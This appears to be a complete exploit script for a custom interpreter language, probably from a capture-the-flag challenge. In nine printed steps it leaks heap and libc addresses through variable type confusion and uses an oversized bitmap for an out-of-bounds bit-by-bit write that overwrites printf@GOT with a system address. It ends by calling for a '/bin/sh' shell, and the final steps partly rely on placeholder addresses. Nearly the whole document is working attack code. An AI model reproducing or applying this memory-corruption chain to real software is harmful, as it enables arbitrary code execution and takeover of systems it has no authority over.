print("=== Final RCE Exploit (Dynamic Calculation) ===");

print("Step 1: Leak heap addresses");
int leak1 = 0;
string leak1 = "first";
int addr1 = leak1;
print("addr1:");
print(addr1);

print("Step 2: Leak libc");
string v2 = "BBBBBBBB";
int v2 = 4231312;
int leaked = length(v2);
print("Leaked libc:");
print(leaked);

print("Step 3: Create target variable");
string target = "target";
int targetaddr = target;
print("Target address:");
print(targetaddr);

print("Step 4: Create bitmap");
bitmap b1 = create(9223372036854775807, 2);

print("Step 5: Calculate addresses");
int entryaddr = targetaddr - 768;
int valueptraddr = entryaddr + 40;
int bitmapptr = addr1 - 4096;
int offset = valueptraddr - bitmapptr;
int bitindex = offset * 8;
print("Calculated bit_index:");
print(bitindex);

print("Step 6: Write printf@GOT to value_ptr");
print("printf@GOT = 0x409048");
print("Writing 64 bits...");
print("Note: Using calculated bitindex + bit_offset for each bit");

int gotvalue = 4202568;
int bit = 0;
while (bit < 64) {
    int bitval = gotvalue & 1;
    int xcoord = bitindex + bit;
    set(b1, xcoord, 0, bitval);
    gotvalue = gotvalue / 2;
    bit = bit + 1;
}

print("Write completed");

print("Step 7: Verify corruption");
int verify = target;
print("Reading target (should be printf address from libc):");
print(verify);

print("Step 8: Write system_addr to GOT");
print("system_addr needs to be calculated from leaked libc");
print("For now, using placeholder");
print("In real exploit, calculate: system_addr = leaked - 0x88550 + 0x58750");
int systemaddr = 139879858407248;
target = systemaddr;

print("Step 9: Trigger shell");
print("print with /bin/sh");

